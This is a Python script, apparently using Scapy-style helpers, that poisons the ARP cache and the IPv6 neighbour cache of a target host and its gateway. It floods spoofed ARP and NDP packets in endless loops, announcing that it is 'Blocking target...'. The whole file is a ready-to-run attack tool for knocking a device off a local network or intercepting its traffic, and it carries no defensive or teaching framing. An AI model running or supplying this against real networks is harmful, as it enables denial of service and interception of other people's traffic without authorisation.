from net_utils import *
from display import *
import time
import threading


def create_arp(sender_ip, target_mac, target_ip):
    my_mac = get_if_hwaddr(conf.iface)
    packet = Ether(src=my_mac, dst=target_mac)/ARP(op="who-has", hwsrc=my_mac, psrc=sender_ip, hwdst=None, pdst=target_ip)
    return packet


def arp_cache_poisoning(target_ipv4):
    target_addr4 = get_addr4(target_ipv4)
    gateway_addr4 = get_addr4(get_gateway())

    packet1 = create_arp(target_addr4[1], gateway_addr4[0], gateway_addr4[1])
    packet2 = create_arp(gateway_addr4[1], target_addr4[0], target_addr4[1])

    try:
        while True:
            sendp(packet1, iface=conf.iface, verbose=False)
            sendp(packet2, iface=conf.iface, verbose=False)
    except KeyboardInterrupt:
        print("Exiting...")
        return
    

def neighbor_cache_poisoning(target_ipv4):
    target_addr6 = get_addr6(target_ipv4)
    gateway_addr6 = get_addr6(get_gateway())
    my_mac = get_if_hwaddr(conf.iface)

    while True:
        NDP_Attack_NS_Spoofing(my_mac, gateway_addr6[1], target_addr6[1], target_addr6[1], my_mac, target_addr6[0], iface=conf.iface, loop=False, inter=0)
        NDP_Attack_NS_Spoofing(my_mac, target_addr6[1], gateway_addr6[1], gateway_addr6[1], my_mac, gateway_addr6[0], iface=conf.iface, loop=False, inter=0)
        time.sleep(1)


def spoofing(target_ip):
    threading.Thread(target=neighbor_cache_poisoning, args=(target_ip, ), daemon=True).start()
    arp_cache_poisoning(target_ip)

    
def main():
    conf.iface = get_interface()
    target_ip = get_target_ip()

    if target_ip:
        print("Blocking target...")
        spoofing(target_ip)

    
main()


